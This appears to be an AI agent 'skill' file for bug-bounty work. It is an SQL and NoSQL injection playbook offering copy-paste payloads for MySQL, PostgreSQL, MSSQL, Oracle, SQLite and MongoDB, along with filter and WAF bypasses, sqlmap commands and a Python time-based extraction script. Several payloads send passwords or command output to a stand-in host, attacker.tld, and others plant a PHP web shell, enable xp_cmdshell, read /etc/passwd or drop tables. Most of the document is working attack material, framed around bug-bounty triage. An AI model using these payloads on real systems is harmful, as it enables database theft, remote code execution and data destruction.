# SKILL: SQL Injection (UNION / Boolean / Time / Error / Out-of-Band / Second-Order)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (sql injection (union / boolean / time / error / out-of-band / second-order)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Modern apps use ORMs, but raw SQL leaks through `LIKE`, sort-column, search builder, raw analytics queries, NoSQL-to-SQL bridges, and stored procs. I detect by behavioral diff (boolean / time / error) before union-based, then dump.

---

## DETECTION
- Submit `'`, `"`, `\`, `'/*`, `';`, `'--` in every parameter; observe diff (500 / different page / different timing).
- Boolean diff: `' AND '1'='1` vs `' AND '1'='2`. Same in JSON: `1' AND 1=1-- -` vs `1' AND 1=2-- -`.
- Time diff: `' OR pg_sleep(5)-- -`, `' UNION SELECT NULL,SLEEP(5)-- -`, `';WAITFOR DELAY '0:0:5'--`.
- Error: `' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -` (MySQL).
- Out-of-band (when blind + no time): `'; SELECT load_file(CONCAT('\\',(SELECT password FROM users LIMIT 1),'.attacker.tld\\a'))-- -` (MySQL on Windows) or DNS via PostgreSQL `COPY ... PROGRAM`.
- Second-order: input stored, executed later by an admin job. Unique canary in input + observe Burp Collaborator hours later.

## EXPLOITATION
1. Identify DB via behavioral diff or version probe (`@@version`, `version()`, `SELECT banner FROM v$version`).
2. Number columns: `' ORDER BY 1-- -` ... `' ORDER BY N-- -`.
3. Find string-rendering columns: `' UNION SELECT 'a','b','c'-- -`.
4. Pull data: `' UNION SELECT username, password, email FROM users-- -`.
5. If blind: sqlmap automates; or write boolean / time oracle in Python.
6. If RCE primitive available (file write / `xp_cmdshell` / `pg_read_server_files` / `INTO OUTFILE` / UDF): escalate.

## PAYLOADS (real, copy-paste, grouped)
### Generic test
```sql
' OR '1'='1
" OR "1"="1
' OR '1'='1'-- -
" OR "1"="1"-- -
') OR ('1'='1
1 OR 1=1
1' OR '1'='1
admin' --
admin' #
admin'/*
') OR ('a'='a
'/**/OR/**/1=1-- -
```

### MySQL
```sql
' UNION SELECT NULL,@@version,user(),database()-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1),0x7e))-- -
' AND ELT(1,SLEEP(5))-- -
1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
1' UNION SELECT 1,2,'<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/x.php'-- -
```

### PostgreSQL
```sql
' OR pg_sleep(5)-- -
'; SELECT pg_sleep(5)-- -
' UNION SELECT NULL,version(),current_user-- -
'; CREATE TABLE x(c text); COPY x FROM PROGRAM 'curl http://attacker.tld/$(whoami)'-- -
'; SELECT pg_read_file('/etc/passwd', 0, 1000)-- -
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.tld/$(id|base64 -w0)'-- -
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'-- -
' UNION SELECT NULL, @@version, system_user-- -
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; DECLARE @x VARCHAR(8000); SET @x=(SELECT password FROM users); EXEC('master..xp_dirtree "\\\\'+@x+'.attacker.tld\\a"')-- -
```

### Oracle
```sql
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
' UNION SELECT banner,NULL FROM v$version-- -
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.tld'))-- -
```

### SQLite
```sql
' UNION SELECT NULL,sqlite_version(),NULL-- -
' AND 1=randomblob(100000000)-- -      -- time-based
' UNION SELECT NULL,group_concat(tbl_name),NULL FROM sqlite_master-- -
```

### NoSQL — MongoDB (Mongoose / native)
```javascript
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":"^a"},"password":"x"}
{"$where":"this.password.length>0"}
{"username":"admin","password":{"$regex":"^(.{8}).*"}}    // brute
// JS/SSJI bridge:
{"$where":"sleep(5000)||true"}
```

### Header-based SQLi (often forgotten)
```http
X-Forwarded-For: ' OR pg_sleep(5)-- -
User-Agent: ' OR pg_sleep(5)-- -
Referer: ' OR pg_sleep(5)-- -
Cookie: session=admin' AND 1=1-- -
```

### JSON body SQLi
```json
{"sort":"id; DROP TABLE users-- -"}
{"filter":{"raw":"1=1)) UNION SELECT * FROM users-- -"}}
```

### GraphQL → SQL backend
```graphql
{ user(id:"1' UNION SELECT username,password FROM users-- -") { name } }
```

## BYPASS TECHNIQUES
- Comment-bypass for filter: `/**/`, `--+`, `#`, `;%00`
- Case: `SeLeCt`, `UnIoN`, `OR`
- Whitespace: `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`, `/**/`
- Encoding: hex literals `0x61646d696e`, `CHAR(97,100,109,105,110)` (MySQL/MSSQL), `CHR(97)` (Oracle/PG)
- Stripped quotes? Use hex / char functions / `0x...` literals
- `WHERE column='admin'` → `WHERE column LIKE 0x61646d696e`
- Stripped spaces? Use `()`, `/**/`, comments
- Strip `OR`, `AND`? Use `||`, `&&`
- `UNION SELECT` filtered? `UNION/**/SELECT`, `UN/**/ION SE/**/LECT`
- `SLEEP` filtered? `BENCHMARK(5000000,SHA1(1))`, `pg_sleep`, `WAITFOR`, heavy queries
- WAF (Cloudflare/AWS) — try generic in body parameter, JSON parameter, or HTTP/2 only

## CHAIN POTENTIAL
- SQLi → admin password hash → crack → ATO.
- SQLi → `INTO OUTFILE` / `xp_cmdshell` / `COPY...PROGRAM` → RCE.
- SQLi → exfil JWT signing secret from config table → forge admin JWT → ATO.
- Blind SQLi → DNS exfil → cumulative data dump in 1 hour.
- SQLi via `ORDER BY` / sort column → sometimes only number-coercion exploit, but error-based dumps still work.

## TOOLS
- `sqlmap` (with `--tamper=` for WAF bypass; `--os-shell` if RCE primitive available)
- `nosqlmap` for MongoDB / CouchDB / Redis
- `ghauri` — modern, faster than sqlmap for some cases
- Burp Active Scan++, Backslash Powered Scanner
- `bbqsql` for blind boolean
- Custom Python with async oracles

## COMMANDS
```bash
# Quick scan
sqlmap -u 'https://target/api?id=1' --batch --random-agent --level=3 --risk=2

# Auth + JSON body
sqlmap -r request.txt --batch --level=5 --risk=3 -p 'id' --technique=BEUSTQ

# WAF bypass tampers
sqlmap -u '...' --tamper=between,space2comment,charencode,modsecurityzeroversioned,equaltolike --random-agent

# OS shell after RCE primitive
sqlmap -u '...' --os-shell --tamper=...

# Out-of-band via DNS exfil
sqlmap -u '...' --dns-domain=attacker.tld --technique=BU

# NoSQL
nosqlmap   # interactive

# Manual blind via Python (when sqlmap fails)
python3 - <<'PY'
import requests, time
URL="https://target/api"; payload="' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{c}',SLEEP(2),0)-- -"
out=""
for i in range(1,33):
  for c in "0123456789abcdef":
    t=time.time()
    requests.get(URL, params={'id': "1"+payload.format(i=i,c=c)})
    if time.time()-t > 1.8: out+=c; print(out); break
PY
```

## EDGE CASES / NOT-A-BUG TRAPS
- **Stacked queries** — only some drivers support `;` (MSSQL yes, MySQL via mysqli not by default, PG yes).
- **PreparedStatements** — almost always safe, but `LIMIT`, `OFFSET`, `ORDER BY`, table/column names cannot be parameterized → still vulnerable.
- **ORM raw fragments** — Sequelize `where: literal('...')`, Django `extra(where=[...])`, SQLAlchemy `text()` — common SQLi escape hatches.
- **Second-order** — input goes into DB unfiltered, then a later query concatenates it into a new SQL → triagers love this.
- **Number-coerced** — `?id=1` rejects strings; try `1 AND SLEEP(5)`, `(SELECT 1 FROM ...)`, or operator like `0/SLEEP(5)`.

## TRIAGE ANGLE (per platform)
- **H1** — show actual data extraction (e.g. `SELECT version(), current_user`); proof-of-time-based via screenshot of curl with `time` command. Never dump real PII.
- **Bugcrowd** — VRT P1 (SQL Injection); even blind = P2.
- Always note rate-limit considered: triagers may say "you only proved 1 row leak; show 100 rows" — show the technique works at scale, not the data itself.

## SEVERITY & CVSS
Generally CVSS 9.8 (Critical) for unauth UNION-based with data leak; Authenticated SQLi 8.8; Blind 7.5–8.5.

## REFERENCES
PortSwigger SQL Injection Cheat Sheet • PayloadsAllTheThings/SQL Injection • bobby-tables.com • OWASP SQLi Prevention • The Web Application Hacker's Handbook Ch. 9 • Bug Bounty Bootcamp Ch. 9
